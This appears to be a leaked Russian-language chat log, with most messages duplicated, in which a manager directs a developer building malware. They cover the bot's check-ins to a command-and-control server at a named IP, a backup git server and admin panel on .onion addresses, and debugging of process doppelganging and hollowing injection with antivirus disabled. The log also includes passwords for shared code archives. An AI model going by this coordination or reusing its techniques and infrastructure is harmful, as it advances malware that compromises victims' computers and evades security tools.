Timestamp	From	To	Message
2020-09-10 10:22:18.335388	kaktus	cany	Привет!
2020-09-12 15:57:54.979807	cany	kaktus	трафик почему-то не проксируется
2020-09-12 15:58:02.086603	cany	kaktus	и не получается сделать git clone
2020-09-12 15:58:18.857018	cany	kaktus	пишет ошибка резолва
2020-09-12 17:20:28.119816	cany	kaktus	и не получается сделать git clone
2020-09-12 17:20:28.121256	cany	kaktus	трафик почему-то не проксируется
2020-09-12 17:20:28.122622	cany	kaktus	пишет ошибка резолва
2020-09-16 19:36:22.972990	kaktus	cany	Привет!
2020-09-16 19:38:41.838899	kaktus	cany	Тебе нужно будет составить планы работ в ближайшее время - на этой неделе:
2020-09-16 19:41:32.270233	kaktus	cany	1) общий план на весь проект - дополни его с учетом обоих ТЗ и файла "01. дополнение к ТЗ.txt" и оцени примерные сроки на все
2020-09-16 19:43:08.395853	kaktus	cany	2) более подробный план на ближайшие 1-2 недели
2020-09-16 19:44:19.570722	kaktus	cany	включай также в план помимо разработки - изучение методов/технологий
2020-09-16 19:50:45.474540	cany	kaktus	Привет!
2020-09-16 19:50:45.475833	cany	kaktus	Тебе нужно будет составить планы работ в ближайшее время - на этой неделе:
2020-09-16 19:50:45.476647	cany	kaktus	1) общий план на весь проект - дополни его с учетом обоих ТЗ и файла "01. дополнение к ТЗ.txt" и оцени примерные сроки на все
2020-09-16 19:50:45.477422	cany	kaktus	2) более подробный план на ближайшие 1-2 недели
2020-09-16 19:50:45.478191	cany	kaktus	включай также в план помимо разработки - изучение методов/технологий
2020-09-20 23:26:24.312519	cany	kaktus	привет
2020-09-20 23:26:38.897667	cany	kaktus	последний командный сервер актуален?
2020-09-20 23:27:03.528311	cany	kaktus	а то сегодня не получилось получить от него какой-либо ответ
2020-09-20 23:27:16.107238	cany	kaktus	и залить свой код тоже не получается
2020-09-20 23:27:26.372023	cany	kaktus	сервер с гитом походу лежит
2020-09-20 23:27:31.530966	cany	kaktus	план я накидал
2020-09-20 23:27:44.021682	cany	kaktus	скинуть во вторник скорее всего смогу
2020-09-21 07:01:35.979067	cany	kaktus	привет
2020-09-21 07:01:35.980754	cany	kaktus	последний командный сервер актуален?
2020-09-21 07:01:35.981794	cany	kaktus	а то сегодня не получилось получить от него какой-либо ответ
2020-09-21 07:01:35.982641	cany	kaktus	и залить свой код тоже не получается
2020-09-21 07:01:35.983387	cany	kaktus	сервер с гитом походу лежит
2020-09-21 07:01:35.984218	cany	kaktus	план я накидал
2020-09-21 07:01:35.985258	cany	kaktus	скинуть во вторник скорее всего смогу
2020-09-22 06:04:54.008629	kaktus	cany	пробуй вот этот адрес: 185.99.2.54
2020-09-22 23:06:02.965391	kaktus	cany	пробуй вот этот адрес: 185.99.2.54
2020-09-24 07:12:20.143883	kaktus	cany	Привет!
2020-09-24 07:12:32.563417	kaktus	cany	1) резервный адрес сервера гит: https://vya52lglt7p65rxz.onion/
2020-09-24 07:12:47.382722	kaktus	cany	учетка таже самая. Используй его, если первый совсем перестанет работать.
2020-09-24 07:13:53.935623	kaktus	cany	2) Не получил от тебя планы работ. Пришли (или продублируй, если уже присылал).
2020-09-24 07:14:59.075462	kaktus	cany	3) Ты писал что по будням на связи с 20:00 МСК, но всю неделю в это время тебя не было. Уточни свой график и пришли мне его.
2020-09-24 22:55:59.323036	kaktus	cany	Привет!
2020-09-24 22:55:59.325223	kaktus	cany	1) резервный адрес сервера гит: https://vya52lglt7p65rxz.onion/
2020-09-24 22:55:59.326433	kaktus	cany	учетка таже самая. Используй его, если первый совсем перестанет работать.
2020-09-24 22:55:59.327400	kaktus	cany	2) Не получил от тебя планы работ. Пришли (или продублируй, если уже присылал).
2020-09-24 22:55:59.328819	kaktus	cany	3) Ты писал что по будням на связи с 20:00 МСК, но всю неделю в это время тебя не было. Уточни свой график и пришли мне его.
2020-09-24 22:59:01.538284	cany	kaktus	Привет, да я действительно на связи с 20:00 по мск, сейчас просто личные проблемы были на этой неделе, за выходные все обязательно наверстаю
2020-09-24 23:05:52.035296	cany	kaktus	от командного сервера получаю not found
2020-09-25 07:01:11.837194	cany	kaktus	Привет, да я действительно на связи с 20:00 по мск, сейчас просто личные проблемы были на этой неделе, за выходные все обязательно наверстаю
2020-09-25 07:01:11.838240	cany	kaktus	от командного сервера получаю not found
2020-09-25 07:19:49.083115	kaktus	cany	командный сервер 185.99.2.54 - на данный момент работает
2020-09-25 07:20:03.166617	kaktus	cany	уточни, какой запрос направляешь и что ожидаешь получить в ответе?
2020-09-25 20:36:31.522348	kaktus	cany	командный сервер 185.99.2.54 - на данный момент работает
2020-09-25 20:36:31.523750	kaktus	cany	уточни, какой запрос направляешь и что ожидаешь получить в ответе?
2020-09-25 21:36:20.491640	cany	kaktus	я пытаюсь отправить запрос на команду GET /%id%/2
2020-09-25 21:37:06.905224	cany	kaktus	как я понял /%id%/2  должно передаваться 3-м параметром в функцию WinHttpOpenRequest
2020-09-25 21:37:28.969119	cany	kaktus	Cookie с группой я в запрос помещаю
2020-09-26 06:24:29.487374	cany	kaktus	я пытаюсь отправить запрос на команду GET /%id%/2
2020-09-26 06:24:29.488566	cany	kaktus	как я понял /%id%/2  должно передаваться 3-м параметром в функцию WinHttpOpenRequest
2020-09-26 06:24:29.489269	cany	kaktus	Cookie с группой я в запрос помещаю
2020-09-26 18:16:36.450805	kaktus	cany	все так
2020-09-26 18:16:41.575554	kaktus	cany	id должен иметь корректный формат, указанный в ТЗ
2020-09-26 18:16:55.829088	kaktus	cany	запросы можно отлаживать в программе Postman
2020-09-26 18:17:30.377326	kaktus	cany	d7Kb4bMa&ks@fkRNso
2020-09-26 18:17:31.566616	kaktus	cany	Download: https://qaz.im/load/KQfTKt/A6Ns5f
Delete: https://qaz.im/index.php?a=delete&q=369478002
2020-09-26 18:17:47.390175	kaktus	cany	вот пример запроса и ответа на него
2020-09-26 18:18:21.032681	kaktus	cany	по запросу бот зарегистрировался в админке, вот ссылка на его карточку: https://scrytnuuszglaugg.onion:4247/testbots/command?id=0000000000000021573362157403129016311834
2020-09-26 18:23:31.664644	kaktus	cany	Что насчет твоих планов работ?
2020-09-26 18:23:37.761573	kaktus	cany	Они нужны срочно. Эта задача в приоритете.
2020-09-26 18:24:17.108337	kaktus	cany	Если не можешь оценить сроки по каким-либо неясным моментам из ТЗ - пришли свои вопросы по этим моментам.
2020-09-27 16:24:18.094714	kaktus	cany	все так
2020-09-27 16:24:18.097459	kaktus	cany	id должен иметь корректный формат, указанный в ТЗ
2020-09-27 16:24:18.098384	kaktus	cany	запросы можно отлаживать в программе Postman
2020-09-27 16:24:18.099109	kaktus	cany	d7Kb4bMa&ks@fkRNso
2020-09-27 16:24:18.099830	kaktus	cany	Download: https://qaz.im/load/KQfTKt/A6Ns5f
Delete: https://qaz.im/index.php?a=delete&q=369478002
2020-09-27 16:24:18.100632	kaktus	cany	вот пример запроса и ответа на него
2020-09-27 16:24:18.101421	kaktus	cany	по запросу бот зарегистрировался в админке, вот ссылка на его карточку: https://scrytnuuszglaugg.onion:4247/testbots/command?id=0000000000000021573362157403129016311834
2020-09-27 16:24:18.102224	kaktus	cany	Что насчет твоих планов работ?
2020-09-27 16:24:18.102997	kaktus	cany	Они нужны срочно. Эта задача в приоритете.
2020-09-27 16:24:18.103739	kaktus	cany	Если не можешь оценить сроки по каким-либо неясным моментам из ТЗ - пришли свои вопросы по этим моментам.
2020-09-27 17:53:17.902147	cany	kaktus	план
2020-09-27 17:53:22.536199	cany	kaktus	a.4Wy8n@n&yMt:3)f
2020-09-27 17:53:34.515102	cany	kaktus	Download: https://qaz.im/load/zd2yKd/b2NEZE
2020-09-27 17:53:37.336624	cany	kaktus	Delete: https://qaz.im/index.php?a=delete&q=743793047
2020-09-27 19:19:18.765670	cany	kaktus	план
2020-09-27 19:19:18.768537	cany	kaktus	a.4Wy8n@n&yMt:3)f
2020-09-27 19:19:18.772446	cany	kaktus	Download: https://qaz.im/load/zd2yKd/b2NEZE
2020-09-27 19:19:18.773289	cany	kaktus	Delete: https://qaz.im/index.php?a=delete&q=743793047
2020-09-28 19:43:54.559484	cany	kaktus	привет
2020-09-29 18:22:16.557418	kaktus	cany	у тебя давно гит не обновлялся
2020-09-29 18:22:27.828005	kaktus	cany	залей в кротчайшие сроки все свои коммиты
2020-09-29 19:40:02.189747	kaktus	cany	у тебя давно гит не обновлялся
2020-09-29 19:40:02.191383	kaktus	cany	залей в кротчайшие сроки все свои коммиты
2020-09-29 23:15:37.018565	cany	kaktus	упорно не работает допел
2020-09-29 23:15:59.434340	cany	kaktus	падает там же на NtCreateThreadEx
2020-09-29 23:16:07.171906	cany	kaktus	без всяких ошибок
2020-09-29 23:16:32.618644	cany	kaktus	и реализация, которую ты мне скинул так же
2020-09-29 23:16:40.787011	cany	kaktus	и на 10 и на 7 x64
2020-09-30 05:46:22.461876	cany	kaktus	упорно не работает допел
2020-09-30 05:46:22.462900	cany	kaktus	падает там же на NtCreateThreadEx
2020-09-30 05:46:22.463833	cany	kaktus	без всяких ошибок
2020-09-30 05:46:22.464662	cany	kaktus	и реализация, которую ты мне скинул так же
2020-09-30 05:46:22.465585	cany	kaktus	и на 10 и на 7 x64
2020-09-30 05:47:31.467212	kaktus	cany	проверяешь с выключенным АВ?
2020-09-30 06:18:22.980049	kaktus	cany	у NtCreateThreadEx какой код вовзрата?
2020-09-30 18:11:48.523357	kaktus	cany	k8Gb#vZMck7ajRvS
2020-09-30 18:11:49.850496	kaktus	cany	Download: https://qaz.im/load/K9kst9/H6T3nQ
Delete: https://qaz.im/index.php?a=delete&q=1221643799
2020-09-30 18:12:04.885788	kaktus	cany	посмотри такую реализацию, это 100% рабочий вариант
2020-09-30 18:14:06.844144	kaktus	cany	проверяешь с выключенным АВ?
2020-09-30 18:14:06.845553	kaktus	cany	у NtCreateThreadEx какой код вовзрата?
2020-09-30 18:14:06.846817	kaktus	cany	k8Gb#vZMck7ajRvS
2020-09-30 18:14:06.847671	kaktus	cany	Download: https://qaz.im/load/K9kst9/H6T3nQ
Delete: https://qaz.im/index.php?a=delete&q=1221643799
2020-09-30 18:14:06.848579	kaktus	cany	посмотри такую реализацию, это 100% рабочий вариант
2020-09-30 18:14:47.793617	cany	kaktus	да я на чистой виртуалке без АВ и дефендер винды выключил
2020-09-30 18:16:04.754851	cany	kaktus	еще вот в реализациях на гитхабе например
2020-09-30 18:16:19.303145	cany	kaktus	не под x64 написано
2020-09-30 18:16:41.835552	cany	kaktus	там например для адресов используются переменные типа DWORD
2020-09-30 18:16:48.290060	cany	kaktus	когда надо DWORD64
2020-09-30 18:17:08.249690	cany	kaktus	так весь process hollowing переделывать надо было
2020-09-30 18:17:41.319359	kaktus	cany	там дан пример, это poc. Дальше - надо его понять и сделать под себя, так подразумевается
2020-09-30 18:18:15.152469	cany	kaktus	может настройки компилятора надо подстроить
2020-09-30 18:18:27.552484	cany	kaktus	я все отладил до системного вызова
2020-09-30 18:18:36.277211	cany	kaktus	и все без ошибок
2020-09-30 18:18:38.091602	kaktus	cany	так ты увидел это вот
2020-09-30 18:18:40.098330	kaktus	cany	[21:11:49] <kaktus> k8Gb#vZMck7ajRvS 
[21:11:50] <kaktus> Download: https://qaz.im/load/K9kst9/H6T3nQ
Delete: https://qaz.im/index.php?a=delete&q=1221643799 
[21:12:05] <kaktus> посмотри такую реализацию, это 100% рабочий вариант
2020-09-30 18:18:45.647259	cany	kaktus	может среда окружения еще плохо настроена
2020-09-30 18:18:57.938234	cany	kaktus	да сейчас смотрю
2020-09-30 18:20:12.995697	kaktus	cany	ну там было 2-3 затыка, это точно. Запомнился только один, что транзакцию надо откатывать после создания потока
2020-09-30 18:20:53.894127	cany	kaktus	понял
2020-09-30 18:21:19.073282	cany	kaktus	а то в большинстве реализаций до
2020-10-02 12:22:12.037913	cany	kaktus	привет
2020-10-02 12:22:33.007385	kaktus	cany	привет
2020-10-02 17:09:38.366979	cany	kaktus	а адрес командного сервера  не изменился?
2020-10-02 17:11:09.510779	cany	kaktus	и домен
2020-10-04 22:23:16.009429	cany	kaktus	сервер не отправляет файл на исполнение
2020-10-04 22:23:32.840078	cany	kaktus	да на отправку инфы о системе
2020-10-04 22:25:10.448757	cany	kaktus	и комиты не доходят
2020-10-04 22:25:21.981601	cany	kaktus	123
